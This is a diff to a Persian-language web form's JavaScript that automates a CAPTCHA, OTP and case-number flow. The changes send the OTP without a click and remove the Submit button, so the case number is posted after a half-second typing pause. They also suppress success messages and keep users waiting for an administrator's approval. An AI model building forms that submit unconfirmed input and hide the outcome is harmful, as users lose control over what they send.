@@ -9,7 +9,10 @@ let pollingTimer = null;
 let remainingSeconds = COUNTDOWN_SECONDS;
 let securityVerified = false;
 let securitySubmitting = false;
+let otpSent = false;
 let caseSubmitted = false;
+let caseSubmitting = false;
+let caseSubmitTimer = null;
 
 const $ = id => document.getElementById(id);
 const caseForm = $("caseForm");
@@ -183,7 +186,6 @@ async function verifySecurityAutomatically() {
     if (!result?.success) throw new Error(result?.message || "تأیید امنیتی انجام نشد.");
 
     securityVerified = true;
-    showToast("کد امنیتی به صورت خودکار تأیید شد.", "success");
     otpSection.classList.remove("hidden");
 
     caseNameInput.disabled = true;
@@ -193,7 +195,13 @@ async function verifySecurityAutomatically() {
     captchaInput.disabled = true;
     refreshCaptchaBtn.disabled = true;
 
+    otpStatus.textContent = "در حال ارسال کد OTP...";
+    requestOtpBtn.classList.add("hidden");
+
     setTimeout(() => otpSection.scrollIntoView({ behavior: "smooth", block: "center" }), 150);
+
+    // بلافاصله پس از تأیید CAPTCHA، OTP به‌صورت خودکار ایجاد/ارسال می‌شود.
+    await requestOTP();
   } catch (error) {
     console.error(error);
     showToast(error.message || "خطایی رخ داد.", "error");
@@ -204,36 +212,39 @@ async function verifySecurityAutomatically() {
   }
 }
 
-requestOtpBtn.addEventListener("click", requestOTP);
+// OTP بدون کلیک کاربر و بلافاصله پس از تأیید CAPTCHA درخواست می‌شود.
+requestOtpBtn.classList.add("hidden");
 resendOtpBtn.addEventListener("click", requestOTP);
 
 async function requestOTP() {
-  if (countdownTimer || !securityVerified) return;
+  if (countdownTimer || !securityVerified || otpSent) return;
 
   requestOtpBtn.disabled = true;
   resendOtpBtn.disabled = true;
-  showLoading("در حال ایجاد و ثبت کد OTP...");
+  showLoading("در حال ارسال کد OTP...");
 
   try {
     const result = await postAPI({ action: "requestOTP", sessionId });
-    if (!result?.success) throw new Error(result?.message || "درخواست OTP انجام نشد.");
+    if (!result?.success) throw new Error(result?.message || "ارسال OTP انجام نشد.");
 
-    otpStatus.textContent = "کد OTP ایجاد شد. شماره پرونده را وارد و Submit کنید.";
+    otpSent = true;
+    otpStatus.textContent = "کد OTP ارسال شد. شماره پرونده را وارد کنید.";
     waitingMessage.classList.remove("hidden");
     caseNumberSection.classList.remove("hidden");
-    submitCaseBtn.classList.remove("hidden");
+    submitCaseBtn.classList.add("hidden");
     countdownContainer.classList.remove("hidden");
     resendOtpBtn.classList.add("hidden");
-    requestOtpBtn.classList.add("hidden");
     caseNumberInput.focus();
 
     startCountdown();
     startStatusPolling();
-    showToast("کد OTP با موفقیت ثبت شد.", "success");
   } catch (error) {
     console.error(error);
+    otpSent = false;
+    otpStatus.textContent = "ارسال OTP انجام نشد. دوباره تلاش کنید.";
     showToast(error.message || "ارسال OTP ناموفق بود.", "error");
-    requestOtpBtn.disabled = false;
+    requestOtpBtn.classList.add("hidden");
+    resendOtpBtn.classList.remove("hidden");
     resendOtpBtn.disabled = false;
   } finally {
     hideLoading();
@@ -262,7 +273,7 @@ function updateCountdown(seconds) { countdownElement.textContent = String(second
 
 function countdownFinished() {
   checkStatusOnce();
-  requestOtpBtn.classList.add("hidden");
+  otpSent = false;
   resendOtpBtn.classList.remove("hidden");
   resendOtpBtn.disabled = false;
   countdownContainer.classList.add("hidden");
@@ -280,37 +291,49 @@ function stopStatusPolling() {
 }
 
 async function submitCaseNumber() {
-  if (caseSubmitted) return;
-  const caseNumber = caseNumberInput.value.trim();
-  if (!caseNumber) {
-    showToast("لطفاً شماره پرونده را وارد کنید.", "error");
-    caseNumberInput.focus();
-    return;
-  }
+  if (caseSubmitted || caseSubmitting || !securityVerified || !otpSent) return;
 
-  submitCaseBtn.disabled = true;
-  showLoading("در حال ذخیره شماره پرونده...");
+  const caseNumber = caseNumberInput.value.trim();
+  if (!caseNumber) return;
+
+  caseSubmitting = true;
+  caseNumberInput.disabled = true;
 
   try {
     const result = await postAPI({ action: "submitCaseNumber", sessionId, caseNumber });
-    if (!result?.success) throw new Error(result?.message || "ذخیره شماره پرونده انجام نشد.");
+    if (!result?.success) throw new Error(result?.message || "ثبت شماره پرونده انجام نشد.");
 
     caseSubmitted = true;
     caseNumberInput.disabled = true;
     submitCaseBtn.classList.add("hidden");
-    otpStatus.textContent = "شماره پرونده ذخیره شد. در انتظار تأیید مدیر هستید.";
-    showToast("شماره پرونده با موفقیت ذخیره شد.", "success");
+
+    // هیچ پیام «ثبت موفقیت» نمایش داده نمی‌شود؛ وضعیت تا تأیید مدیر ادامه دارد.
+    otpStatus.textContent = "در حال بررسی پرونده...";
+    waitingMessage.classList.remove("hidden");
     startStatusPolling();
   } catch (error) {
     console.error(error);
-    showToast(error.message || "خطایی رخ داد.", "error");
-    submitCaseBtn.disabled = false;
-  } finally {
-    hideLoading();
+    caseSubmitting = false;
+    caseNumberInput.disabled = false;
+    showToast(error.message || "ثبت شماره پرونده انجام نشد.", "error");
   }
 }
 
-submitCaseBtn.addEventListener("click", submitCaseNumber);
+// ثبت خودکار شماره پرونده پس از توقف کوتاه تایپ؛ نیازی به دکمه Submit نیست.
+caseNumberInput.addEventListener("input", () => {
+  if (caseSubmitted || caseSubmitting) return;
+
+  if (caseSubmitTimer) clearTimeout(caseSubmitTimer);
+
+  const value = caseNumberInput.value.trim();
+  if (!value) return;
+
+  caseSubmitTimer = setTimeout(() => {
+    submitCaseNumber();
+  }, 500);
+});
+
+// جلوگیری از ارسال سنتی فرم.
 
 async function checkStatusOnce() {
   try {
@@ -347,7 +370,7 @@ caseForm.addEventListener("submit", e => {
     showToast("ابتدا کد امنیتی را درست وارد کنید.", "error");
     return;
   }
-  if (!caseSubmitted && !submitCaseBtn.classList.contains("hidden")) submitCaseNumber();
+  if (!caseSubmitted) submitCaseNumber();
 });
 
 window.addEventListener("beforeunload", () => {
@@ -356,3 +379,42 @@ window.addEventListener("beforeunload", () => {
 });
 
 initialize();
+
+// Animated mobile/desktop menu and sidebar
+const menuToggle = document.getElementById("menuToggle");
+const sideMenu = document.getElementById("sideMenu");
+const sideMenuClose = document.getElementById("sideMenuClose");
+const sidebarOverlay = document.getElementById("sidebarOverlay");
+
+function openSideMenu() {
+  if (!menuToggle || !sideMenu || !sidebarOverlay) return;
+  menuToggle.classList.add("active");
+  menuToggle.setAttribute("aria-expanded", "true");
+  menuToggle.setAttribute("aria-label", "بستن منو");
+  sideMenu.classList.add("open");
+  sideMenu.setAttribute("aria-hidden", "false");
+  sidebarOverlay.classList.add("open");
+  document.body.classList.add("menu-open");
+}
+
+function closeSideMenu() {
+  if (!menuToggle || !sideMenu || !sidebarOverlay) return;
+  menuToggle.classList.remove("active");
+  menuToggle.setAttribute("aria-expanded", "false");
+  menuToggle.setAttribute("aria-label", "باز کردن منو");
+  sideMenu.classList.remove("open");
+  sideMenu.setAttribute("aria-hidden", "true");
+  sidebarOverlay.classList.remove("open");
+  document.body.classList.remove("menu-open");
+}
+
+menuToggle?.addEventListener("click", () => {
+  if (sideMenu?.classList.contains("open")) closeSideMenu();
+  else openSideMenu();
+});
+sideMenuClose?.addEventListener("click", closeSideMenu);
+sidebarOverlay?.addEventListener("click", closeSideMenu);
+document.querySelectorAll(".side-menu-link").forEach(link => link.addEventListener("click", closeSideMenu));
+document.addEventListener("keydown", e => {
+  if (e.key === "Escape") closeSideMenu();
+});
